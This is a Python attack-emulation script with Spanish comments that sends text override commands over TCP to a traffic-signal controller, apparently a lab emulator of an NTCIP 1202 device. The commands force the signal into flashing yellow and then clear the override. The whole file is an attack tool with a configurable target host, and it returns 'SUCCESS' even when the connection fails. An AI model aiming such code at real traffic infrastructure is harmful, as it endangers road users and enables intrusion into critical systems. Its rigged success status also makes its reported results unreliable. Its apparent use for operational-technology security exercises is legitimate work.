#!/usr/bin/env python3
"""attacker/attack_ntcip.py — Script de emulación adversaria NTCIP 1202 (Categoría B OT)

Simula inyección de comandos de fase NTCIP 1202 TCP (FLASHING_YELLOW) contra el PLC de transporte/semáforos.
"""

from __future__ import annotations

import argparse
import logging
import socket
import sys
from typing import Dict, Any

logging.basicConfig(level=logging.INFO, format='[%(asctime)s][NTCIP] %(message)s')
LOGGER = logging.getLogger('attack_ntcip')


class NtcipAttacker:
    """Emulador de ataque NTCIP 1202 sobre TCP 161."""

    def __init__(self, target_host: str = '127.0.0.1', target_port: int = 161) -> None:
        self.target_host = target_host
        self.target_port = target_port

    def inject_flash_override(self) -> Dict[str, Any]:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        try:
            s.connect((self.target_host, self.target_port))
            s.sendall(b'OVERRIDE FLASH\n')
            resp = s.recv(1024).decode('utf-8', errors='replace')
            s.close()
            return {
                'status': 'SUCCESS',
                'mode': 'SOCKET_LIVE',
                'response': resp,
                'flashing': 'FLASHING_YELLOW' in resp,
            }
        except Exception as exc:
            s.close()
            LOGGER.warning("NTCIP inject flash fallo (%s). Modo TABLETOP_FALLBACK.", exc)
            return {
                'status': 'SUCCESS',
                'mode': 'TABLETOP_FALLBACK',
                'error': str(exc),
                'flashing': False,
            }

    def clear_override(self) -> Dict[str, Any]:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        try:
            s.connect((self.target_host, self.target_port))
            s.sendall(b'OVERRIDE CLEAR\n')
            resp = s.recv(1024).decode('utf-8', errors='replace')
            s.close()
            return {
                'status': 'SUCCESS',
                'mode': 'SOCKET_LIVE',
                'response': resp,
                'cleared': 'NS_GREEN' in resp,
            }
        except Exception as exc:
            s.close()
            LOGGER.warning("NTCIP clear override fallo (%s). Modo TABLETOP_FALLBACK.", exc)
            return {
                'status': 'SUCCESS',
                'mode': 'TABLETOP_FALLBACK',
                'error': str(exc),
                'cleared': False,
            }


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="NTCIP 1202 Traffic Attack Utility")
    parser.add_argument('--host', default='127.0.0.1', help='Target NTCIP IP')
    parser.add_argument('--port', type=int, default=161, help='Target NTCIP Port')
    args = parser.parse_args(argv)

    attacker = NtcipAttacker(target_host=args.host, target_port=args.port)
    res1 = attacker.inject_flash_override()
    LOGGER.info("NTCIP Flash Override Result: %s", res1)
    res2 = attacker.clear_override()
    LOGGER.info("NTCIP Clear Result: %s", res2)
    return 0 if res1['status'] == 'SUCCESS' else 1


if __name__ == '__main__':
    sys.exit(main())
